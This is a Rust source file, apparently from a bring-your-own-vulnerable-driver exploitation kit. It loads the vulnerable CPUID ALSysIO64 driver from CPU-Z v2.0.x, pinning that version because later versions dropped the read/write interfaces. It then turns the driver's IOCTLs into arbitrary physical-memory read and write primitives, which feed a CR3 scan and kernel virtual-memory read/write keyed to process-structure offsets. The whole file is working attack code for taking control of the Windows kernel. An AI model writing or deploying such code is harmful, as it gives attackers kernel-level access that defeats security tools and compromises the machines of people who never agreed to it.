//! ALSysIO64 phys-mode bootstrap — mirrors [`crate::win::wdt`] over
//! `\\.\ALSysIO` (CPUID CPU-Z v2.0.x, see `byovd_drivers/alsysio.rs` for the
//! protocol ground truth + the v2.0.x version pin).
//!
//! The bootstrap is the shared generic skeleton
//! ([`crate::win::wdt::bootstrap_phys_with`]): load driver → open device →
//! CR3 scan → [`VaKernelRw`]. This file only carries the ALSysIO64-specific
//! parts: the device open + the [`PhysRead`]/[`PhysWrite`] impls over the
//! driver's IOCTL protocol.
#![cfg(target_os = "windows")]

use crate::byovd::{resolve_sym, DeviceIoControlFn, VulnDriverIoctl};
use crate::byovd_drivers::AlsysIo;
use crate::offsets::EprocessOffsets;
use crate::win::driver_load::LoadedDriver;
use crate::win::pagewalk::{PhysRead, PhysReadError};
use crate::win::va_rw::{PhysWrite, VaKernelRw};
use crate::{KitError, KrwError};
use core::ffi::c_void;

/// Cap per-IOCTL transfer (same rationale as WDT: keep MmMapIoSpace small).
const IOCTL_CHUNK: usize = 0x40000;

/// GENERIC_READ | GENERIC_WRITE.
const GENERIC_RW: u32 = 0xC000_0000;
const OPEN_EXISTING: u32 = 3;
const INVALID_HANDLE: *mut c_void = (-1isize) as *mut c_void;

type CreateFileWFn = unsafe extern "system" fn(
    *const u16,
    u32,
    u32,
    *mut c_void,
    u32,
    u32,
    *mut c_void,
) -> *mut c_void;
type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

/// Physical-memory R/W primitive over a live `\\.\ALSysIO` handle.
pub struct AlsysPhys {
    device: *mut c_void,
    dioctl: DeviceIoControlFn,
    close: CloseHandleFn,
}

// Raw handle + raw fn pointers; the handle is owned exclusively by this
// struct and the fns are immutable kernel32 code addresses.
unsafe impl Send for AlsysPhys {}
unsafe impl Sync for AlsysPhys {}

impl Drop for AlsysPhys {
    fn drop(&mut self) {
        unsafe {
            (self.close)(self.device);
        }
    }
}

impl AlsysPhys {
    /// Chunked physical read (bounded per-IOCTL transfer).
    fn read_at(&self, pa: u64, dst: &mut [u8]) -> Result<(), KrwError> {
        for (i, part) in dst.chunks_mut(IOCTL_CHUNK).enumerate() {
            let off = (i as u64).saturating_mul(IOCTL_CHUNK as u64);
            unsafe {
                AlsysIo::phys_read(self.device, self.dioctl, pa + off, part)?;
            }
        }
        Ok(())
    }

    /// Chunked physical write (bounded per-IOCTL transfer).
    fn write_at(&self, pa: u64, src: &[u8]) -> Result<(), KrwError> {
        for (i, part) in src.chunks(IOCTL_CHUNK).enumerate() {
            let off = (i as u64).saturating_mul(IOCTL_CHUNK as u64);
            unsafe {
                AlsysIo::phys_write(self.device, self.dioctl, pa + off, part)?;
            }
        }
        Ok(())
    }
}

impl PhysRead for AlsysPhys {
    fn read_phys(&self, pa: u64, dst: &mut [u8]) -> Result<(), PhysReadError> {
        self.read_at(pa, dst).map_err(|_| PhysReadError::Ioctl)
    }
}

impl PhysWrite for AlsysPhys {
    fn write_phys(&self, pa: u64, src: &[u8]) -> Result<(), PhysReadError> {
        self.write_at(pa, src).map_err(|_| PhysReadError::Ioctl)
    }
}

/// Open `\\.\ALSysIO` and resolve the raw Win32 functions.
///
/// # Safety
/// The device must exist (driver loaded, v2.0.x — v2.1.0.0 opens fine but its
/// R/W IOCTLs are gone, see the driver module doc). BSOD-free: open-only.
pub unsafe fn open_alsys() -> Result<AlsysPhys, KrwError> {
    let create_file = resolve_sym::<CreateFileWFn>(b"kernel32.dll", b"CreateFileW")?;
    let dioctl = resolve_sym::<DeviceIoControlFn>(b"kernel32.dll", b"DeviceIoControl")?;
    let close = resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle")?;

    // device_path() is 11 code units WITHOUT a NUL — CreateFileW needs one.
    let mut path_buf = [0u16; 12];
    path_buf[..11].copy_from_slice(AlsysIo.device_path());

    let device = unsafe {
        create_file(
            path_buf.as_ptr(),
            GENERIC_RW,
            0,
            core::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            core::ptr::null_mut(),
        )
    };
    if device == INVALID_HANDLE {
        return Err(KrwError::Other(
            "ALSysIO open \\\\.\\ALSysIO failed (driver loaded?)".into(),
        ));
    }
    Ok(AlsysPhys {
        device,
        dioctl,
        close,
    })
}

/// Full ALSysIO64 phys-mode bootstrap via the shared generic skeleton.
///
/// # Safety
/// Loads a kernel driver and opens its device. Same contract as
/// [`crate::win::wdt::bootstrap_wdt`].
pub unsafe fn bootstrap_alsys(
    sys_path: &[u16],
    svc_name: &[u16],
    nt_base: u64,
    eprocess: &EprocessOffsets,
    scan_budget_mb: usize,
) -> Result<(LoadedDriver, VaKernelRw<AlsysPhys>), KitError> {
    unsafe {
        crate::win::wdt::bootstrap_phys_with(
            sys_path,
            svc_name,
            nt_base,
            eprocess,
            scan_budget_mb,
            open_alsys,
        )
    }
}
